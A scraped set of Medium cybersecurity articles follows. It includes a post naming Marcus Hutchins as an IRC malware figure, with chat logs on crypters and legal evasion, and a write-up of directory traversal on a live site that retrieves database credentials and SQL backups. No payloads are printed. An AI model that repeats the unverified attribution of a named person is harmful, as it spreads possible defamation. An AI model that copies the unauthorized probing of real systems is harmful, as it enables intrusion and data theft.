The (now deleted) betabot defense league post on his blog (written by touchme) should be a clear link to the IRC touchme, who is a clear friend of betamonkey. Certainly the IRC logs could be faked, however the pastebin upload timestamps place them four years in the past, making it impossible that they were created to slur Marcus for any of his recent actions.
The most direct evidence I have saved for the end. Shortly after betabot related content started being posted on exposedbotnets.com, someone posted some alleged dox of betamonkey (possibly not him, but looking up the guy on linkedin the skillsets seem to match) and another comment claimed it was all fake. In response, someone called the second commenter out: “Hi Iarkey (Marcus Hutchins) lololollol”. The blogger timestamps are clear, the comment identifying Marcus Hutchins as iarkey/Touchme was posted in 2013. A simple google search finds hackforums posts indicating that iarkey and touchme were linked nicks.
voidptr IRC logs: https://pastebin.com/qZJ5v5M4
https://pastebin.com/DUNq5VYp <- some great content in this one
[18:11] <+TouchMe> 2 more btc’s are all mine[18:11] <+TouchMe> :3[18:13] <TheCurator> TouchMe: You hording?[18:14] <+TouchMe> sort of[18:14] <+TouchMe> some is for buying coke rest is for hoarding[18:14] <TheCurator> Nice ;)[18:15] <TheCurator> Anyone here a fan of basshunter?[18:16] <+TouchMe> used to like his music[18:16] <Batmayne> maybe my next big project should just be a crypting service[18:16] <Batmayne> i feel like that could almost be more worth it[18:17] <TheCurator> Batmayne: more worth it than what?[18:17] <vapor> people would pay a lot for a crypter that is great for betabot, and who can provide that better than the coder itself :P[18:18] <Batmayne> than bot[18:18] <Batmayne> not exactly monetary wise either[18:18] <Batmayne> i mean like[18:18] <Batmayne> it’s virtually zero-risk[18:18] <Batmayne> and still a lot of cash[18:18] <TheCurator> That’s a good point[18:19] <Batmayne> bot brings in more money but crypt service is much better in terms of safety[18:19] <TheCurator> Bot is very dangerous[18:20] <TheCurator> You can get arrested for just selling a bot not even using it[18:20] <Batmayne> if you knowingly do anything to support a crime that is still a crime itself[18:20] <vapor> technically he never sold the bot[18:20] <Batmayne> at least in the US[18:21] <TheCurator> For a crypting service you just cover your ass in the TOS[18:21] <Batmayne> so technicalllllllllllly anyone who has provided help towards say, carberp, knowing it was going to be sold to commit fraud, could all be wrapped up under a RICO charge in the US[18:21] <Batmayne> yeah i guess[18:21] <TheCurator> Selling a bot is like selling a nuke[18:21] <Batmayne> in the end basically, it comes down to how well you can prove that you didn’t know what they were doing[18:21] <vapor> couldnt you say that betabot is for educational purposes only[18:21] <Batmayne> if there is a single log of you acknowledging their activities[18:21] <Batmayne> thats it[18:21] <Batmayne> no[18:21] <Batmayne> you can’t do that vapor[18:21] <vapor> oh[18:21] <Batmayne> you can, but it doesn’t make shit of a difference[18:21] <bake> lmfao[18:22] <TheCurator> reguardless of TOS they will try and arrest you for selling a bot[18:22] <TheCurator> They hate bot makers[18:22] <Batmayne> vapor: in the end they really just have to convince a jury (in US), so even if you try and go by technicalities it isn’t always so easy[18:22] <bake> curator,[18:22] <bake> they hate fraud[18:22] <vapor> true[18:22] <TheCurator> bake: That too.[18:23] <Batmayne> whenever you take peoples money you move to the top of the priorities list[18:23] <Batmayne> the top things always include things that are gaining media traction, and things that are costing <someone> a lot of money[18:23] <TheCurator> Money is the ultimate trap[18:23] <vapor> is it illegal to sell a crypter[18:23] <Batmayne> usually targeting businesses and banks will get an investigation rolling easily[18:24] <TheCurator> vapor: Not really[18:24] <Batmayne> like using ZeuS to lift 200,000 out of a business account would probably get its own investigation right away[18:24] <Batmayne> and later merged into a larger one if you are doing that to more than one[18:24] <TheCurator> Vapor: Depends on how you sell it[18:24] <+TouchMe> lul[18:25] <+TouchMe> crypter based work is the most boring shit ever[18:25] <vapor> BetaCrypt[18:25] <TheCurator> All aboard the BetaCrypt train![18:25] <Batmayne> instead of ‘betafed’[18:25] <Batmayne> it could be[18:25] <Batmayne> BetaFUD[18:26] <vapor> well that can be false advertisement if it ever gets unfud[18:26] <vapor> then bitches be complaining[18:26] <TheCurator> Lol <(x.x)<[18:26] <+TouchMe> damn now someone has reminded me of basshunter i have to do lsd[18:26] <+TouchMe> i would love basshunter on lsd o.O
If only Touchme had read the scroll back.
If other people have voidptr IRC logs, dump them. Skidlist, if you still have all yours let me know.
Written by
","['Wannacry', 'Cybersecurity', 'Malware']"
The Newcomer’s Guide to Cyber Threat Actor Naming - Florian Roth - Medium,https://medium.com/@cyb3rops/the-newcomers-guide-to-cyber-threat-actor-naming-7428e18ee263?source=tag_archive---------9-----------------------,"I was driven by a deep frustration when I started my public “APT Groups and Operations” spreadsheet in 2015. I couldn’t understand why I had to handle so many different names for one and the same threat actor.
Today, I understand the reasons for the different names and would like to explain it so that newcomers stop asking for a standardization. Off the record: by demanding a complete standardization you just reveal a lack of insight.
But let’s start from the beginning: As we all know, vendors name the threat actors that they track. Some of them just use numbers like Mandiant/FireEye, Dell SecureWorks or Cisco Talos and others like Kaspersky, CrowdStrike or Symantec use fancy names and naming schemes that create an emotional, figurative or mythological context.
We secretly love these names.
They shed a different light on our work — the tedious investigation tasks, the long working hours, the intense remediation weekends and numerous hours of management meetings. If the adversary is Wicked Panda, Sandworm or Hidden Cobra, we perceive ourselves as some kind of super heroes twarthing their vicious plans. These names create an emotional engagement.
The following table, which is a tab in my public spreadsheet, shows naming schemes used by the different vendors:
In contrast to people that actually work in this field, many non-specialist voices frequently criticize vendors for a number of reasons. They lament the lack of standardization, overconfident attribution and believe to recognize biased reporting depending on the vendors home country. Most of this criticism is unjustified.
Frankly, I believe that if they had a deeper understanding of the indicators that led to an attribution or the reasons for different names they would immediately dive into the “valley of despair”.
I see myself slowly climbing the “slope of enlightenment”, learning every day from many researchers that I admire and respect. In a short article like this I cannot provide a deeper understanding of the indicators that led to a certain attribution, but I can work out the different reasons that lead to different names and naming schemes.
As you can see in my spreadsheet, numerous names exist and mapping them is often imprecise and sometimes flawed. But I had to start somewhere and a partly incorrect mapping is better than having no mapping at all. (others may disagree)
There are “human”, “technical” and “operational” reasons that lead to all the different names. The following section lists most of these reasons categorized by their type.
These are the major “human” caused reasons for naming confusions:
These are the major “technical” reasons why names diverge:
This leads to the following problems:
But there are also less technical and more “operational” reasons that lead to different names:
As you can see, many reasons lead to different names. The standardization of threat actor names is not as easy as it sounds. The Antivirus industry confronts the same critics since many years and cannot comply with the demands for very similar reasons.
I wouldn’t release vendors from all responsibility. It is still crucial that they keep linking their research to the research of others, pointing out partial or full IOC overlaps and alignments with previously reported operations based on the respective TTPs. Otherwise, mapping the different threat actors names becomes an irresolvable task.
APT Groups and Operations Spreadsheet (HTML version)
Mentioned abbreviations:IOC = Indicator of CompromiseTTP = Tools, Tactics, ProceduresAPT = Advanced Persistent ThreatC2 = Command and Control
NBC article with errors:
Written by
","['Cybersecurity', 'Threat Intelligence', 'Cyber', 'Cybercrime']"
The Node.js Ecosystem Is Chaotic and Insecure - Commit Log - Medium,https://medium.com/commitlog/the-internet-is-at-the-mercy-of-a-handful-of-people-73fac4bc5068?source=tag_archive---------2-----------------------,"It seems like only yesterday we had the “left-pad” fiasco where Azer Koçulu ended up pulling his packages after a name dispute.
It wasn’t really that dangerous that the code was deleted, that only broke the builds which everyone noticed during their build process and the whole ordeal lasted for like two hours.
It was dangerous because that it was a small redundant package that no one would ever actually bother to audit before deploying, so anyone could have jumped in and published a package in it’s place with the same functionality but also stick some malicious code into it and get a free ride to get deployed essentially anywhere that ran JavaScript.
Well, it sure is a good thing we learned our lesson from that isn’t it?
When left-pad hit, developers from other camps were having their laughs at how this tiny piece of code could be a module. Good thing we have learned by now right? Well, no, not at all.
The following wonder of engineering aptly named is-odd has around 500 000 downloads per day.
Going through the dependents tree, I found hundreds of projects depending on this but more importantly also the big players including Webpack, BrowserSync and Babel depend on it.
Basically this means that if this package was a trojan waiting to do a bait-and-switch in a minor patch then it could theoretically inject code into the developer’s machine but also inject itself into the code generation of whatever prepreprocessors available via require, including Babel and Webpack.
Now that’s a lot of power to give to a package that should just have been a single modulus or bitwise operator call.
But surely this is a freak occurrence right? Actually no, it’s common practice today, the “do not repeat yourself” mantra has been taken a bit too literally where many will consider even writing basic one liners re-inventing the wheel.
The is-number package has nearly two million downloads per day. is-odddepends on this package.
My personal favorite is the is-even package, because using the negation operator is also reinventing the wheel?
Now, to be fair to the author and maintainers of the glorious packages mentioned earlier the problem applies to all packages in the package repository. There are thousands of similarly trivial packages from hundreds of both known and completely unknown anonymous authors which are just as popular with millions of downloads per week and indirectly depended upon by many of the popular projects.
It’s simple; don’t trust package managers, every dependency is written by some random developer somewhere in the world and is a potential attack vector. This applies to all package managers but these one liner packages makes it so that no effort is required.
All it takes is for one single maintainer to wait until the reach is wide enough, then release a patch with a malicious payload and it spreads like wildfire because no one actually looks at and locks down a dependency like is-string to a patch version.
Is this being too paranoid? Perhaps, or maybe it’s the healthy amount considering the massive reach these trivial packages can have.
There has already been a bunch of browser extensions that have been injected with a cryptocurrency miner using the same bait and switch strategy, and those are supposedly reviewed by humans.
There’s no lack of smart people out there trying to spread their malware, which begs the question why would anyone looking to do something malicious bother with all the work involved in finding cross-site scripting exploits when you can just create a rubbish package with zero effort, release it and just let the developers spread it around.
At this point it seems fairly probable that in a best case scenario a few cryptocurrency miners are currently living in the npm package repository already running on developers machines, servers and even on client’s machines through the Web and Electron applications. It could also be worse, with actual nefarious malware mining sensitive data.
Written by
","['Archive', 'JavaScript', 'Programming', 'Cybersecurity', 'Technology', 'Tech']"
The NSA: An Inside View - Loren Sands-Ramshaw - Medium,https://medium.com/@lorendsr/the-nsa-an-inside-view-e411a174b483?source=tag_archive---------6-----------------------,"Migrating post from my old blog. Originally posted 12/10/13 and hit the top of Hacker News.
In which I relate my experience as an NSA employee and impart my thoughts on the policies in place, my former coworkers, and the current cyber war.
I am an American patriot. Many impressions may come to mind at that word, “patriot”: perhaps that I am a Republican, that I don’t care about people outside the US, or that I am afraid of them. In my case, none of these conceptions apply. Patriotism to me simply means that I care about the US and its future. I hope my story gives you further information and perspective on the NSA’s activities.
I was a spy for the US government. Not the Bond/Alias type of agent, but the electronic type — a cyber spy. I helped build small pieces of the global systems that gather electronic intelligence. And I am one of the few people whose former employment at the NSA you can verify: I appeared in a recruitment video. (Pardon my halting speech — I was declassifying on the fly.) You can match my face to the photo on my Kickstarter page.
I was a civilian employee of the NSA for two years starting in mid-2010. I worked at the Agency’s Fort Meade headquarters for the first year. It was a dramatic time in the intelligence world, encompassing Stuxnet (the first known example of cyberwarfare resulting in a physical effect, reportedly made by the NSA and Israel), the first major release of US documents on WikiLeaks, and the locating of bin Laden. The declassified version of my job title was “Global Network Vulnerability Analyst.” I was in the Computer Network Operations Development Program, and my office was S32X: Signals Intelligence Directorate (S) > Data Acquisition (S3) > Tailored Access Operations (S32) > Special Tactics and Techniques (S32X). Most of my time was spent writing Ruby code to help with the systems that gather and manage electronic intelligence.
Many are concerned about the NSA listening to their phone calls and reading their email messages. I believe that most should not be very concerned because most are not sending email to intelligence targets. Email that isn’t related to intelligence is rarely viewed, and it’s even less often viewed if it’s from a US citizen. Every Agency employee goes through orientation, in which we are taught about the federal laws that govern NSA/US Cyber Command: Title 10 and Title 50. We all know that it’s illegal to look at a US citizen’s data without a court order. I use the term “look” deliberately: the Agency makes the distinction that looking at data is surveillance, while gathering it from locations outside the US is not. We gathered everything, and only looked at a tiny percentage of it. I am okay with this distinction both because I don’t mind if my emails are copied to an Agency database and likely never read and because from a technical standpoint it would seriously impair our ability to spy if we couldn’t gather everything.* The Agency is an intelligence organization, not a law enforcement agency.
The NSA copy of my emails won’t be viewed by police or FBI investigating me about marijuana use, for instance. Law enforcement might get a search warrant and retrieve a copy from Google, but not from the NSA. FBI employees don’t even have SI (communications intelligence) clearance, and all NSA-collected data is classified Top Secret//SI. The NSA copy of my emails will only be viewed if the Agency can convince a judge that I might be a foreign agent. And the judges aren’t pushovers. I remember that one time a judge ordered the Agency to suspend a certain type of operation because it had mistakenly generated a report that included US person data. The system had to be reprogrammed to preclude that type of mistake before it could be used again. This was not a trivial decision: not being able to use that system for a time had a serious impact on our ability to get the job done.
Edit 12/15/13: Reuters reports of a Special Operations Division (SOD) in the DEA that tips off law enforcement from classified sources, including NSA collect. I have no independent knowledge of this program. Two sources state, “Because warrantless eavesdropping on Americans is illegal, tips from intelligence agencies are generally not forwarded to the SOD until a caller’s citizenship can be verified.” Tips from US-citizen data should always be screened out. I do not think they should only “generally” be screened, and if that is the case, as far as I can tell it’s illegal. I do not take issue with the practice of parallel construction in general. Consider the case in which one TS//SI collection station or method gathers data about a foreigner that leads to a SOD tip. The existence of the tip cannot be revealed because knowledge of it could compromise the collection station/method.
The vast majority of unauthorized retrievals of US-person data are unintentional. I do not care about these cases because the analysts do not care about my data. They’re looking for intelligence about foreign entities of interest. They won’t spent time on my private love letters. I do care about intentional retrieval of my data, and there have been rare cases of such illegal actions (the chair of the intelligence committee estimates once a year): for instance, one employee spied on a spouse.
As we were reminded by an internal memo after WikiLeaks, even when something is public knowledge, if it’s still classified, we can’t talk about it outside a SCIF. So while there is much information online about XKeyscore (I’m not saying anything about its validity), only a small amount of information about XKS has been declassified through Agency statements. I can say it was an analyst tool that I had access to. I had to make sure that my searches didn’t use US selectors, such as a US phone number or IP address. A required field of every search was a description of what the search was for. This justification, along with the selectors, was examined by my assigned reviewer, one of my superiors. I didn’t test it, but I’m sure there was automated analysis that prevented or flagged use of US selectors. There was another system I worked on that for instance automatically ignored all US IP addresses. I knew that if I were to query in XKS for US persons or perform non-US queries for personal reasons I could be fired, and at least in the former case criminally prosecuted. Not that I seriously considered doing so. Which brings me to the next topic, the character of NSA employees.
I’d like to give you a view of what the people behind the NSA are like. I have a very high opinion of my former coworkers. My opinion of course does not preclude the possibility of an NSA employee being a bad person. And even if they are well-intentioned, they may think of developing intelligence capabilities before implementing the oversight and minimization aspects when designing new systems. But the general character does suggest a low likelihood that they will abuse their powers for personal gain.
NSA employees are the law-abiding type. Firstly, the lawbreaking type isn’t likely to want to work for the government. Secondly, if they did apply, it is quite unlikely they would make it through the clearance process. All NSA employees receive Top Secret and SI clearance, which requires a background check, psych screening, and counterintelligence and lifestyle polygraph tests. In the background check, interviewers call your references and walk around your neighborhood, workplace, or school, asking people about your character. You take a long automated psych test that flags troubling personality traits. It felt thorough, and I remember one inquiry from the old, stern psychologist interviewing me: “The test showed you may have trouble asserting yourself when needed. Do you agree?” (To which I replied, “No, I believe I can assert myself when needed.”) They examine your 127-page Standard Form 86, in which you include lists of your illegal activities, foreigners you have worked with or befriended, and where you have lived and traveled in your life and with whom. They verify your SF-86 information in a number of ways, including during the polygraph. The polygrapher also asks many questions to determine whether you are law-abiding and patriotic. While the efficacy of polygraphs has been questioned, and while I’m sure given sufficient training and natural psychosomatic control one could beat them, I think they’re fairly accurate. They may yield some false positives (I, for example, initially failed when I said, “No” in response to, “Have you ever given classified information to a foreign entity?” — this is before I knew any classified information — and had to fly back to DC for a second attempt a month later), but I believe false negatives are rare.
But I digress — the rare cases of unauthorized data retrieval were not polygraph-trained foreign spies trying to infiltrate the Agency, but rather regular employees illicitly viewing communications for personal gain. I do not believe that there are many such employees. I was very impressed by my colleagues at the Agency. I was impressed not only by their technical ability, but also by their dedication to the mission. They are the most earnest and conscientious group of people I have ever met.
In 1991 the USSR dissolved and the Cold War ended. The world let out a sigh of relief, safe in the the knowledge that humanity wasn’t crazy enough to destroy itself. That security we had is gone. North Korea has nuclear weapons and is threatening to fire them at the US. While I find this alarming, and I hope you do too, I do not mean to fear monger. I do not think fear should rule your judgement, but the reality is that we still live in world that has hostile groups of people, my own country included. Reality should enter your cost-benefit analyses.
When two countries have nuclear weapons, they can’t openly physically fight each other without going MAD. One of the ways in which they struggle is via computers. An international cyber war has been going on for years. It is reportedly not limited to nations that are overtly hostile. It has been escalating and will continue to do so. There is much about the war that is not publicly known, but the public information is scary enough. The Washington Post reported on entities gaining access to computers in DoD and other federal agency networks since 2003. CBS reported that in 2007 the US suffered an “espionage Pearl Harbor” in which entities “broke into all of the high tech agencies, all of the military agencies, and downloaded terabytes of information.” The targets of the attacks are not limited to just military and government: in 2010 the government warned industry about China’s military hacking into American companies’ networks.
One could argue that most of the cyber “attacks” mentioned above aren’t really acts of war, but rather spying. However, when you gain control of a computer, you can do more than just copy data — you can change things. Computers now control many things and will control more in the future. Take for example the power grid. My thesis at Dartmouth was entitled, “Creating Large Disturbances in the Power Grid: Methods of Attack After Cyber Infiltration,” and I am confident that the grid can be taken down by a hacker who has gained access to control system computers. While power grid management networks are supposed to be air gapped for security, Iran’s nuclear enrichment facility control network was protected by an air gap, and that gap was jumped by Stuxnet. Halting use of USB drives is not enough to protect air gapped systems, as Ruiu's recent research on badBIOS demonstrates. One indication of the gravity of cyber war is the DoD’s belief that they may need to use nuclear weapons in response to future cyber attacks.
If you are a US citizen, I hope you are reassured to know how capable and thorough your cyber spy agency and military command are. I was extremely impressed by the Agency’s capabilities, both those that have been declassified and those that are still unknown to the public. If you are a citizen of the UK, Canada, New Zealand, or Australia, you may also be glad, because everything the NSA collects is by default shared with your government (the default classification is TS//SI//REL TO FVEY, or “release to five eyes”, which are the aforementioned countries and the US). Even if you are not a citizen of the Five Eyes, you shouldn’t be worried about your data being viewed unless you’re involved with a group of interest, such as a foreign government or violent organization. You may be unhappy about the fact that we’re spying on your government, just as I am unhappy that the Chinese military is hacking into America’s government and industry. And I would prefer a world in which spying was unnecessary. But humanity is not there yet.
I do believe that the safeguards against unauthorized data retrieval by Agency employees can and should be improved. I do not believe that their information-gathering powers should be curtailed. Such restriction would not only hinder the Agency’s ability to gather intelligence, but also impede its ability to wage cyberwarfare.* The NSA is our best hope in this war. In my mind, the Agency’s continued dominance of the Internet is absolutely worth the once-a-year one-in-three-hundred-million chance that your private data will be purposefully viewed by an NSA employee.
As to why I resigned — I wanted to work more on personal coding projects and start a company. You can help fund my food startup’s first product, the most healthy mayonnaise ever mass-produced, on Kickstarter.
Discussion on Hacker News. Follow me at @lorendsr.
* — I am not permitted to say why this is the case, but it is true.
This essay was deemed UNCLASSIFIED and approved for public release by the NSA’s office of Pre-Publication Review on 11/21/2013 (PP 14–0081).
Written by
","['Nsa', 'Cybersecurity', 'Security']"
The Perils of Probe Requests - Brannon Dorsey - Medium,https://medium.com/@brannondorsey/wi-fi-is-broken-3f6054210fa5?source=tag_archive---------4-----------------------,"All of the Wi-Fi devices you own are constantly broadcasting the name of every networks they’ve ever connected to. Turn them off.
You know how your phone automagically connects to any Wi-Fi network its seen before? Ever wondered how that works? It’s blatantly stupid. Whenever your phone’s Wi-Fi is turned on, but not connected to a network, it openly broadcasts the SSIDs (network names) of all previously-associated networks in an attempt to connect to one of them. These small packets, called probe requests, are publicly viewable by anyone in the area running trivially simple sniffing software, and you’d be surprised how unique your list of networks are.
Whats worse, probe requests include a unique device fingerprint called a MAC address that can be used to specifically identify each device. So we’ve got a situation where:
The information gathered from probe requests can be combined with wardriving datasets, geo-tagged wireless networks databases, to map the physical location of these networks in a city. Popular community-driven wardriving website WiGLE provides publicly accessible data for over 350 million wireless access points collected by volunteers. This is an incredibly small subset of the wardriving data that Apple and Google have freely collected from your Android or iPhone. In fact, your smartphone is constantly scanning for Beacon frames broadcast by wireless access points and using your GPS to associate those network’s MAC addresses with your location. This information is then uploaded to GOOG or AAPL, amassing the two largest collections of wireless network maps in the world. Has your phone ever prompted you to “Turn on Wi-Fi for better location accuracy?” This feature uses your phone’s wireless card to scan and upload nearby access points to leverage these proprietary datasets, collected en masse (without payment), to offer highly-accurate geolocation information that can be derived from these network fingerprints.
Probe requests have been known to be collected at hotels, malls, airports and other public locations in order to track and identify unknowing passersby. Companies can sell this data or use it for their own market research. I’ve personally sniffed probes at O’Hare Int’l Airport, collecting fingerprints from thousands of devices and tens of thousands of network names; Enough probes to crash my Macbook Pro waiting for my flight to board.
So yeah… that’s where we are at with Wi-Fi these days. The Probe request problem is an example of what happens when a wireless protocol released in 1998 is implemented as the standard almost a decade later when smartphones hit the market. These solutions that worked for stationary personal computers don’t scale well when nearly a third of the world’s population now walks around with a Wi-Fi device on their person. Protecting personal information from blanket collection and exploitation is only going to become a more challenging problem as the number of internet-connected devices expect to reach 75 billion by 2025. That’s nearly 10 devices per human on earth.
Wi-Fi is fucked, everything is broken, Donald J. Trump is president, and the earth is dying. Ok, taking a step back, you might be wondering what you can do to protect yourself. The solution is not without flaws; turn your Wi-Fi off when you aren’t connected to a known network. Doing so will prevent your device from leaking your network names and device fingerprint to the open world. The solution is awkward, easy to forget, and sub-par. But its what we’ve got.
If you’ve got an Android device, the Smart WiFi Toggle app claims to enable/disable your Wi-Fi based on location rules. I’ve never used it, and I’m cautious to provide a random app the admin permission that it requires, but its very highly rated on the Google Play store. I haven’t come across anything like this for iOS, and as of 2014, the programmatic control over Wi-Fi needed to do this was only available if a device was jailbroken.
What follows are a few continued musings on about creative exploitations of probe requests in the wild, followed by a short tutorial that shows you how you can collect your own probe requests, or rather, everyone else’s.
Back in 2015, I worked with Branger_Briz to create ProbeKit, a critical software art project that addressed the probe request problem through a metaphor of butterfly collection. We developed an application that captured probing devices as unique, one-of-a-kind, butterflies. The software allowed the user to collect MAC addresses and network information from nearby devices as they wandered around the city on a “network data safari.” Once captured, you could inspect each butterfly’s “migration patterns” inferring information about where the device owner works, lives, and plays.
Jasper van Loenen recently created a wonderful response to the probe requests phenomenon called Linger. This small networked device constantly rebroadcasts the probe requests its collected, creating a virtual wireless environment made up of the ghost signals of every device its encountered. As the device travels, its collection grows, and the fragments of identity extracted from stray probes become implicitly integrated into the artwork and the spaces it inhabits.
In a similar vain, artist David Rueter created Shenanigans, an attempt to introduce “information entropy” into the bulk collection surveillance systems that are increasingly using probe requests to identify and track people throughout their daily life. Shenanigans is a community-powered network of small battery-powered wireless routers that broadcast the probe requests of device owners who wish to introduce noise into Wi-Fi based tracking systems. Participants submit their device’s MAC address to be rebroadcast by each node in the network, in multiple locations all over the world. Doing so provides the participant with an arguable disassociation from the MAC address assigned to them by their device’s manufacturer. They are presented with a Certificate of De-identification, allowing them to prove that their unique device fingerprint is shared with everyone participating in the network.
Probe requests can be captured by anyone with a computer and a wireless card that supports monitor mode. However, this brief tutorial is not for the faint of heart. The following instructions assume general comfortability with the unix command-line. This code has been written to run on debian-based linux operating system. For more information, see the GitHub repository.
If all goes well, you should begin to capture probe requests from nearby devices.
Probe requests are saved as a space-delimeted “csv” to probes.txt by default. This can be changed using the OUTPUT environment variable. CHANNEL_HOPING cycles the wireless card’s channel settings in an attempt to capture more probe requests, but can be disabled by omitting the environment variable or setting its value to 0. If you have any questions or problems, please create an issue on the GitHub issues page.
Written by
","['Wifi', 'Hacking', 'Cybersecurity', 'iPhone', 'Android']"
The Power of Directory Traversal - HackerNoon.com - Medium,https://medium.com/hackernoon/the-power-of-directory-traversal-93e8dfd608ef?source=tag_archive---------9-----------------------,"Directory Traversal is a hacking method which allows the attacker to access restricted directories and files within the website and execute a command outside the web server’s root directory.
Weekends, No work, Chill Time. So, I decided to test the security of a website. I started it by using a Google Dork (Advanced Search Technique on Google)
Executing the dork above on Google gives me these results:
So, I got 4 results with same URL Scheme
I figured out that the “b” parameter is the File Name, “d” parameter is directory of the file, and “t” parameter is the MIME type of the file.
So, It quickly reminds me that this kind of URL Scheme is possibly vulnerable to Directory Traversal.
Here’s the URL I browsed to test if the site is vulnerable to Directory Traversal:
After browsing the URL above, something popped out and asked me to download a file and here’s the content of the file I have downloaded.
Yes, they’re vulnerable! Now, it’s time to use a tool to enumerate their directory and find some interesting files.
While the tool is enumerating directories and files, I noticed a file called connectDB.php and I know I can do directory traversal to download the file. So, here’s the payload I used:
Yes, I have successfully download the connectDB.php file and here’s the content of the file:
Alright! I got their Database Details but what if there’s something more? So, I ran the tool again to enumerate more directory and files.
What? A DB(Database) Directory? Is it a login page to database or a collection of backed up databases? Let’s find out:
So, I browsed the site.ph/db/ and found theses .sql files:
Okay, I’m done.
I hope you learned something with this blog. :)
Allan Jay Dumanhug is the Founder and CEO of Secuna, a security program management service. Prior to Secuna, Allan worked as an IT Security Analyst at University of the Philippines Diliman eUP Project and former top hacker on Facebook(Q1 of 2016) and HackerOne.
Please visit https://secuna.ph/ for more info.
Hacker Noon is how hackers start their afternoons. We’re a part of the @AMI family. We are now accepting submissions and happy to discuss advertising & sponsorship opportunities.
If you enjoyed this story, we recommend reading our latest tech stories and trending tech stories. Until next time, don’t take the realities of the world for granted!
Written by
","['About', 'Help', 'Go Home', 'Directory Traversal', 'Website Security', 'Cybersecurity', 'Hacking']"
The Real “Weakest Link” In Security Isn’t What You Think,https://context.newamerica.org/the-real-weakest-link-in-security-isnt-what-you-think-a3dec75c3ff6?source=tag_archive---------8-----------------------,"It’s an all-too familiar story: A company reports a data breach,and there’s an immediate blame game. Inevitably, we point the finger at humans — the person who responded to that phishing email ( a fake message that a bad actor uses to gain access to a broader set of data or a network) or who unknowingly clicked on ransomware “malvertising” (a fake ad that, when clicked, releases malware that locks digital files and demands a ransom to release the data).
Humans, we’re told, are the weak link of security. That was a key theme in the Verizon Data Breach Investigations Report released last week. After all, ransomware and phishing are effective because they’re able to so skillfully target human vulnerabilities.
This post has moved. To continue reading, please visit https://www.newamerica.org/cybersecurity-initiative/humans-of-cybersecurity/blog/real-weakest-link-in-security-isnt-what-you-think
Written by
","['Analytics', 'Cybersecurity']"
There Is Literally No Excuse to Keep Using Facebook,https://medium.com/s/story/there-is-literally-no-excuse-to-keep-using-facebook-anymore-f76eaa5573fa?source=tag_archive---------1-----------------------,"The writing is on the wall. Facebook is detrimental to global discourse, has harmed democracies around the world, and, because of its dependence on advertising, has responded to criticism by making only minor, cosmetic changes. Mark Zuckerberg and his team will continue to allow the social network to be a haven for fake news, hoaxes, threats, and much, much worse. It’s gotten to the point that Zuckerberg said this summer that Holocaust deniers won’t be removed from the platform, and pages of known hoax or hate purveyors like InfoWars aren’t getting booted until the damage is long done.
Facebook has had several opportunities to show that it understands its responsibility as the world’s largest social network — a platform that now has 2.23 billion active users worldwide, sees 4.75 billion pieces of content shared daily, and is responsible for one out of every five page views in the United States. But it has failed completely.
If you don’t #QuitFacebook, you’re part of the problem.
The first sign of trouble was the 2014 election of Narendra Modi in India. Behind his charismatic, calm persona were rampant rumors aimed at getting the country’s Hindu majority to see the Muslim minority as a threat and vote for his right-wing, Hindu-nationalist party. Facebook was a key platform in the spread of viral videos and fake statistics about Muslims, and it worked. Along the way, religious violence claimed the lives of dozens of Indians.
Then it was government supported trolls from Russia and China spreading disinformation and harassing women, journalists, and critics that led to the early 2016 election of Rodrigo Duterte in the Philippines. But that, like the election in India, was far away from Silicon Valley, so Facebook did nothing (and its stock price kept rising). Duterte’s election has resulted in 12,000 extrajudicial killings and severe clampdowns on freedom of the press in the country.
Then it happened in the U.S. The platform allowed Russian-linked trolls to send viral, fake news content that may have played a role in the election of Donald Trump to the presidency in late 2016. A little more than a year after, we learned that Facebook gave access to our data to a firm called Cambridge Analytica, which used that data to drive a massive, pro-Trump operation. As more details emerge, this begs the question — what else has Facebook done or allowed that we don’t know about?
Nearly every time Facebook has been given a clear choice whether to act or not, it has chosen the path of least resistance, only acting when overwhelming outside pressure forced it to, and always too slowly.
If you perhaps thought seeing this happen closer to home would make a difference, you’d be mistaken. Months after Trump’s election, the worst case of violence connected to Facebook so far took place when the Myanmar military began attacking Rohingya villagers in Rakhine state, killing thousands and forcing a mass exodus of people into neighboring Bangladesh. It was predictable — local nonprofit organizations saw hate speech and violence-inducing content on Facebook before the violence erupted and attempted to inform Facebook.
The company did nothing. Facebook is the match to the flame that is destroying societies around the world.
Facebook is proving itself completely unable to address any of the challenges facing its platform for a simple reason: The company is doing fine financially. Its stock price now is higher than it was right after the 2016 election, and its profits are still growing quarter by quarter. Clamping down on ads of viral content is not a financially sound decision for the platform. Facebook seems to value profit over the safety of its users, and it is reticent to cut off what is a massive and growing source of its revenue — Russia, China, Saudi Arabia, Iran, and a growing number of other state and non-state actors who see Facebook as key to their strategies of dominating the global online debate and pushing their worldview.
For example, China is already the second-largest ad market for the company, $5 billion in total and growing fast. This is a country whose government denies the 1989 Tiananmen Square massacre, has a massive online troll army, and is building out a global media apparatus to influence discourse across the world. You can bet China plans to invest heavily in using the Facebook platform to spread its worldview, either via ads or through its legions of trolls. Facebook depends on these countries for its revenue and lofty stock price — hence, inaction.
The only way to hold Facebook responsible for allowing for hate speech, online trolls, and Holocaust deniers on its platform is for us to quit.
Facebook wants you to perceive improvements, though, and what it will do is blanket metro and subway stations around the world with ads claiming it is doing something. But nearly every time Facebook has been given a clear choice whether to act or not, it has chosen the path of least resistance, only acting when overwhelming outside pressure forced it to, and always too slowly. It took a year after the horrific, well-documented violence in Myanmar for Facebook to take the dramatic step of blocking a few accounts.
Here’s the thing. We — users, especially those of us in the U.S. and Europe — are what Facebook values. They make money from each of us. A lot of money. In 2017, each U.S. user was worth $20.21 (and Canadian users, $26.76). At some point, we have to accept the reality — continuing to use Facebook means we’re complicit in the drug killings in the Philippines, the rise of hate content, the harassment of women and minorities, and the ongoing genocide of the Rohingya. As long as we stay on the platform, Facebook will continue to make money selling ads from unsavory characters. It’s time to quit and make a statement.
Facebook is, by design, an addictive tool. For years, the key metric mentioned by the giant during its quarterly earnings calls was user engagement, the time the average user spent on the platform. All of its innovations were designed to get us to spend more time on Facebook, like with the News Feed, launched in 2006, which essentially introduced endless scrolling to the masses. There is even evidence that Facebook is studying how to manipulate our emotions and running psychological tests on us. They claim they won’t use that information to target us. Then again, they also said they wouldn’t share our data with outside vendors or track us on other sites, and they are.
Another key factor is the network effect. We tend to stick to a platform if our coworkers, friends, neighbors, and family are on it. This is likely the biggest barrier to quitting Facebook. People dislike Facebook but find it so useful — checking in on the aunt you’d otherwise never talk to or keeping in touch with friends from high school — that they can’t not use it.
There are alternatives that replace the functionality of Facebook without sacrificing the ability to communicate and share information with friends.
